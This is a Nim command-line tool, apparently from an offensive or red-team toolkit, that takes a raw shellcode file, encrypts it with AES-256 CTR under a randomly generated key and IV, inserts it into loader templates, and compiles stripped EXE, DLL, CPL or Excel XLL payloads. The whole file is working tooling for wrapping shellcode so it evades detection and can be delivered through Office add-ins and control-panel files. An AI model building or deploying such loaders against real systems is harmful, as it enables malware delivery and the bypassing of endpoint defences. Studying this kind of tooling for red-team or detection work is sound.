import base64
import strutils
import sequtils
import strformat
import os
import osproc
import nimcrypto
import random

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

let 
    args = commandLineParams()
    pCount = paramCount()

var 
    shellcodeFilePath: string
    fileType: string
    architecture: string
    verbosity: string
    file: string
    templatePath: string
    shellcode: string
    scArray: seq[byte]
    aesPasswd: string
    shaKey: MDigest[256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    encSC: seq[byte]



if pCount < 2:
    echo fmt"Usage: {getAppFileName()} <rawShellcodeFile> <fileType> <architecture> <verbose>"
    echo "\nArguments <architecture> for file types other than XLL and <verbose> are optional"
    quit(1)
else: 
    shellcodeFilePath = args[0]
    fileType = args[1]

    if pCount > 2:
        architecture = args[2] #only for xll payloads

    if pCount > 3:
        verbosity = args[3]

let
    compileExe: string = r"nim c -d:mingw --opt:none --app=gui --cpu=amd64 -d:strip -d:release -o=simpleexe.exe temp_simpleexe.nim"
    compileCpl: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=amd64 -d:strip -d:release -o=simplecpl.cpl temp_simplecpl.nim"
    compileDll: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=amd64 -d:strip -d:release -o=simpledll.dll temp_simpledll.nim"
    compileXll64: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=amd64 -d:strip -d:release -o=simplexll.xll temp_simplexll.nim"
    compileXll32: string = r"nim c -d:mingw --opt:none --app=lib --nomain --cpu=i386 -d:strip -d:release -o=simplexll.xll temp_simplexll.nim"

proc aesencrypt(): void = 
    
    ## Nim's way API using openArray[byte].

    var ectx: CTR[aes256]

    scArray = shellcode.toByteSeq

    encSC = newSeq[byte](len(scArray))

    randomize()
    const asciiRange = 32..126
    aesPasswd = 32.newSeqWith(asciiRange.rand.char).join
    var expandedKey = sha256.digest(aesPasswd)
    #shaKey = expandedKey
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

    discard randomBytes(addr iv[0], 16)

    # Initialization of CBC[aes256] context with encryption key
    ectx.init(key, iv)
    # Encryption process
    ectx.encrypt(scArray, encSC)
    # Clear context of CBC[aes256]
    ectx.clear()

proc generatePayload(): void =
    var 
        templateFile: string
        tempFile: string
        compileCmd: string
    # Read raw shellcode file
    try:
        shellcode = readFile(shellcodeFilePath)
        echo "shellcode = ", toHex(shellcode)
    except IOError as err:
        echo "[-] Error: Could not open file!"
        quit(1)

    # Encode/Encrypt bytes
    #let b64shellcode = encode(file)
    aesencrypt()
    # Add base64 shellcode to template
    case fileType:
        of "exe":
            templatePath = "templates/simpleexe.nim"
            templateFile = templatePath.readFile()
            tempFile = "temp_simpleexe.nim"
            compileCmd = compileExe
        of "cpl":
            templatePath = "templates/simpledll.nim"
            templateFile = templatePath.readFile()
            tempFile = "temp_simplecpl.nim"
            compileCmd = compileCpl
        of "dll":
            templatePath = "templates/simpledll.nim"
            templateFile = templatePath.readFile()
            tempFile = "temp_simpledll.nim"
            compileCmd = compileDll
        of "xll":
            templatePath = "templates/simplexll.nim"
            templateFile = templatePath.readFile()
            tempFile = "temp_simplexll.nim"
            if architecture == "x64":
                compileCmd = compileXll64
            else:
                compileCmd = compileXll32
        else:
            echo "Error: filetype argument must be dll, xll, or cpl!"
            quit(1)

    let placeholder = "REPLACE_ME"
    #echo "scArray = ", scArray
    #echo "\n"
    echo "encSC = ", encSC

    let replacement = toHex(encSC)
    try:
        echo "[*] Encrypting shellcode using AES-256 CTR!"
        templateFile = templateFile.replace(placeholder, replacement)
        tempFile.writeFile(templateFile)
    except:
        echo "[-] Error: Cannot add encrypted shellcode to template file!"
        quit(1)
    let origPass = "BLANK_PASSWORD"
    try:
        echo "[*] Adding AES key to template file!"
        templateFile = templateFile.replace(origPass, aesPasswd)
        tempFile.writeFile(templateFile)
    except:
        echo "[-] Error: Cannot add AES key to template file!"
        quit(1)
    let origIV = "BLANK_IV"
    try:
        echo "[*] Adding AES IV to template file!"
        templateFile = templateFile.replace(origIV, toHex(iv))
        tempFile.writeFile(templateFile)
    except:
        echo "[-] Error: Cannot add AES IV to template file!"
        quit(1)

    let compileResults = execCmdEx(compileCmd)
    #tempFile.removeFile
    if verbosity == "verbose":
        echo compileResults.output

when isMainModule:
    if pCount >= 2:
        generatePayload()
    else:
        echo fmt"Usage: {getAppFileName()} <rawShellcodeFile> <fileType> <architecture> <verbose>"
        quit(1)
